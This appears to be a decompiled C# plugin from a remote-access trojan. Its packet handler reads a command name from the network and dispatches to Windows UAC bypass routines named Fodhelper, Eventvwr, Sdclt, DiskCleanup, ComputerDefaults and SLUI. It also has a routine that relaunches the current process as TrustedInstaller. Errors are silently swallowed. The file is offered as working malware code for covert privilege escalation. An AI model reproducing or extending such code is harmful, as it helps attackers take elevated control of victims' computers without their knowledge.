using System.Diagnostics;
using Leb128;
using SharpBypassUAC;
using Stub.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			string text = (string)LEB128.Read(data)[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 5:
				switch (text[0])
				{
				case 'r':
					if (text == "runas")
					{
						new RunAs();
					}
					break;
				case 'S':
					if (text == "SDCLT")
					{
						new Sdclt();
					}
					break;
				}
				break;
			case 11:
				switch (text[0])
				{
				case 'D':
					if (text == "DiskCleanup")
					{
						new DiskCleanup();
					}
					break;
				case 'r':
					if (text == "runassystem")
					{
						StartAsTrushInstaller.Start(Process.GetCurrentProcess().MainModule.FileName);
					}
					break;
				}
				break;
			case 8:
				if (text == "Eventvwr")
				{
					new EventVwr();
				}
				break;
			case 9:
				if (text == "Fodhelper")
				{
					new FodHelper();
				}
				break;
			case 16:
				if (text == "Computerdefaults")
				{
					new ComputerDefaults();
				}
				break;
			case 4:
				if (text == "SLUI")
				{
					new Slui();
				}
				break;
			}
		}
		catch
		{
		}
	}
}
